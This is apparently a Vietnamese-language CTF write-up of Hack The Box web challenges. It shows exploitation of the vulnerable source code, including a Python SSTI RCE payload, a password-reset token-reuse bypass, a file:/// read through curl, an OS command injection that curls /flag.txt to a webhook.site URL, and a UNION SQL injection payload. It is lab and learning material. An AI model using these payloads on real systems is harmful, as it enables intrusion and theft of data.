only hacks
  =>( xss lead to get user-cookie => chiem quyen dieu khien acc )
  o trong chat section 
  (vi vo tinh k filter user input trong qua trinh in lai ra lich su tro chuyen)
_____________________________________________________________________________________________________________________________________________________________________________________________________________________
flag command:
  + ta thay command cua nguoi dung se dc gui den /api/monitor va se tra ve response (co the tra ve flag neu command hop ly)
  
     if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
          await fetch('/api/monitor', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify({ 'command': currentCommand })
          })
              .then((res) => res.json())
              .then(async (data) => {
                  console.log(data)
                  await displayLineInTerminal({ text: data.message });
  
                  if(data.message.includes('Game over')) {
                      playerLost();
                      fetchingResponse = false;
                      return;
                  }
  
                  if(data.message.includes('HTB{')) {
                      playerWon();
                      fetchingResponse = false;
  
                      return;
  
  + ta lai thay web gui request den /api/options de lay danh sach cac command hop le
  
  const fetchOptions = () => {
      fetch('/api/options')
          .then((data) => data.json())
          .then((res) => {
              availableOptions = res.allPossibleCommands;
  
          })
          .catch(() => {
              availableOptions = undefined;
          })
  }
  
  + ta to mo muon biet them ve cac lua chon nen thu truy cap vao api chua cac option thi thay no co 1 command an , thu command ay thi ta co flag
  
  {
    "allPossibleCommands": {
      "1": [
        "HEAD NORTH",
        "HEAD WEST",
        "HEAD EAST",
        "HEAD SOUTH"
      ],
      "2": [
        "GO DEEPER INTO THE FOREST",
        "FOLLOW A MYSTERIOUS PATH",
        "CLIMB A TREE",
        "TURN BACK"
      ],
      "3": [
        "EXPLORE A CAVE",
        "CROSS A RICKETY BRIDGE",
        "FOLLOW A GLOWING BUTTERFLY",
        "SET UP CAMP"
      ],
      "4": [
        "ENTER A MAGICAL PORTAL",
        "SWIM ACROSS A MYSTERIOUS LAKE",
        "FOLLOW A SINGING SQUIRREL",
        "BUILD A RAFT AND SAIL DOWNSTREAM"
      ],
      "secret": [
        "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
      ]
    }
  }
  nhap "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack" thi ta co flag
_____________________________________________________________________________________________________________________________________________________________________________________________________________________
Spookifier
  nhan thay code viet == python + thu ${7*7} duoc nen ta co the suy luan ra la ssti cho python
  su dung payloads de rce:
  
  <%import os%>${os.popen(str().join(chr(i)for(i)in[99, 100, 32, 47, 59, 99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116])).read()}
  voi 99 100 32 , la cac ki tu ascii dc ma hoa thanh so vi khi dua vao server-side lai k xu ly dc nh ki tu nhu la " ' -
  
  source: https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
_____________________________________________________________________________________________________________________________________________________________________________________________________________________
Armaxis
ta dc cho 1 server voi 2 service o 2 cong rieng biet : 8080 va 1337 (lay trong docker)
8080 : server mail
1337 : 1 portal de dang nhap

+ p1:
de dang nhap dc vo admin , chung ta phai loi dung ham reset mk:

  router.post("/reset-password/request", async (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).send("Email is required.");
  
    try {
      const user = await getUserByEmail(email);
      if (!user) return res.status(404).send("User not found.");
  
      const resetToken = crypto.randomBytes(16).toString("hex");
      const expiresAt = Date.now() + 3600000;
  
      await createPasswordReset(user.id, resetToken, expiresAt);
  
      await transporter.sendMail({
        from: "noreply@frontier.com",
        to: email,
        subject: "Password Reset",
        text: `Use this token to reset your password: ${resetToken}`,
      });
  
      res.send("Password reset token sent to your email.");
    } catch (err) {
      console.error("Error processing reset request:", err);
      res.status(500).send("Error processing reset request.");
    }
  });
  
  router.post("/reset-password", async (req, res) => {
    const { token, newPassword, email } = req.body; // Added 'email' parameter
    if (!token || !newPassword || !email)
      return res.status(400).send("Token, email, and new password are required.");
  
    try {
      const reset = await getPasswordReset(token);
      if (!reset) return res.status(400).send("Invalid or expired token.");
  
      const user = await getUserByEmail(email);
      if (!user) return res.status(404).send("User not found.");
  
      await updateUserPassword(user.id, newPassword);
      await deletePasswordReset(token);
  
      res.send("Password reset successful.");
    } catch (err) {
      console.error("Error resetting password:", err);
      res.status(500).send("Error resetting password.");
    }
  });
cong voi viec ta co gmail cua admin trong database
      await runInsertUser(
        "admin@armaxis.htb",
        `${crypto.randomBytes(69).toString("hex")}`,
        "admin",
      );

Boi vi ta khong the nao brute dc mk nen minh se loi dung lo hong trong ham reset passwd 
async function getPasswordReset(token) {
  const query = `SELECT * FROM password_resets WHERE token = ? AND expires_at > ?`;
  try {
    const reset = await get(query, [token, Date.now()]);
    return reset;
  } catch (error) {
    throw error;
  }
}
ta thay rang ham check token chi quan tam den token co hop le k va con han k chu k noi den viec token phai la cua ai ca
==> bypass == lay token reset cua th khac ap vao tk cua admin

+ p2:
sau khi dang nhap vao portal , ta thay dc trong phan "chuyen vu khi" , trong phan "note" , ta thay rang co 1 template ho tro chung ta 
curl request di:
  function parseMarkdown(content) {
      if (!content) return '';
      return md.render(
          content.replace(/\!\[.*?\]\((.*?)\)/g, (match, url) => {
              try {
                  const fileContent = execSync(`curl -s ${url}`);
                  const base64Content = Buffer.from(fileContent).toString('base64');
                  return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
              } catch (err) {
                  console.error(`Error fetching image from URL ${url}:`, err.message);
                  return `<p>Error loading image: ${url}</p>`;
              }
          })
      );
  }

-> su dung template de doc file lay flag th (flag location o trong docker lmao)
![img]("file:///flag.txt")
voi file:/// la duong dan den local file
=> ta lay dc flag
https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/Screenshot%202025-02-21%20044444.png
_____________________________________________________________________________________________________________________________________________________________________________________________________________________

Void Whispers

trang web bắt đầu với 1 trang thay đổi 4 param của 1 file config trong 1 hệ thống gì đấy
<>

file source chủ yếu tập trung vào 4 file source PHP 
Qua quá trình đọc code , ta thấy đươc trong file IndexController.php (nó sẽ là nơi 4 param mình tác động sẽ được xử lý )có đoạn 
 public function updateSetting($router)
  {
    $from = $_POST['from'];
    $mailProgram = $_POST['mailProgram'];
    $sendMailPath = $_POST['sendMailPath'];
    $email = $_POST['email'];

    if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
      return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'], 400);
    }

    if (preg_match('/\s/', $sendMailPath)) {
      return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400); // filter space của param $sendMailPath
    }

    $whichOutput = shell_exec("which $sendMailPath"); // vuln code
    if (empty($whichOutput)) {
      return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
    }

ta thấy bảo mật rất sơ sài , param $sendMailPath chỉ bị filter nhẹ (cấm space) r được ném thẳng vào shell_exec() để thực thi os command ==> os injection
tuy vậy , ta lại k có kết quả của shell_exec() đưa ra màn hình nên => ta sẽ lưu kết quả ra biến môi trường r đáp vào url như 1 tham số , gửi url đấy đến server của ta => lấy đc flag
ta dùng ${IFS} thay thế space thường và cat</flag.txt để né space
payloads:
/flag.txt;KMA=$(cat</flag.txt);curl${IFS}https://webhook.site/<u_webhook_id>?kma=${KMA}

flag: HTB{c0mm4nd_1nj3ct1on_15_3457_t0_f1nD!}
_____________________________________________________________________________________________________________________________________________________________________________________________________________________
Unholy Union

đầu tiên , mở chall ra , ta có 1 Inventory Manager cho phép nhập tên items và sẽ trả về thông tin của các item ấy
web còn cho chúng ta sẵn 1 cửa sổ để ta có thể theo dõi trực tiếp user-input được đưa vào câu lệnh truy vấn ntn ,xuất kết quả / lỗi của câu lệnh sql với user-input
ta vừa nhập
ảnh :
tiếp đến , khi mò vào file , chúng ta thấy user-input của ta đc đặt thẳng vào câu lệnh sql , k một chút filter :

app.get("/search", async (req, res) => {
  const query = req.query.query ? req.query.query : ""; //user input đc đưa vào biến này
  let results = { status: null, message: null };

  try {
    let sqlQuery;

    if (query === "") {
      sqlQuery = "SELECT * FROM inventory";
    } else {
      sqlQuery = `SELECT * FROM inventory WHERE name LIKE '%${query}%'`; // đáp thẳng user-input vào câu lệnh sql luôn 
    }

    const [rows] = await pool.query(sqlQuery);
    results.status = "success";
    results.message = rows;
  } catch (err) {
    console.error("Error executing query:", err.stack);
    results.status = "failed";
    results.message = err.message;
  }

  return res.json(results);
});

==> sql injection
tuy vậy , ta cần chú ý đến 
1. phải encoding payload trc khi gửi,nếu k thì có thể sẽ gặp trường hợp ntn:
ảnh: https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/Screenshot%20(157).png
https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/Screenshot%20(158).png
 (do việc encoding các kí tự đặc biệt k chuẩn nên server-side k thể url decode đúng ra kí tự đó đc ->làm sai mục đích của payload)

2. chú ý đến số cột được xuất ra mặc định khi ghép kết quả của 2 câu lệnh truy vấn (sử dụng union)để xuất ra cho phù hợp , tránh thừa thiếu cột dẫn đến việc lỗi

payloads gốc: Plumbus%' union select flag,null,null,null,null from flag #
payloads khi đc url encode: 
Plumbus%25%27%20union%20select%20flag%2Cnull%2Cnull%2Cnull%2Cnull%20from%20flag%20%23
hoặc
%50%6c%75%6d%62%75%73%25%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%66%6c%61%67%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%20%66%72%6f%6d%20%66%6c%61%67%20%23


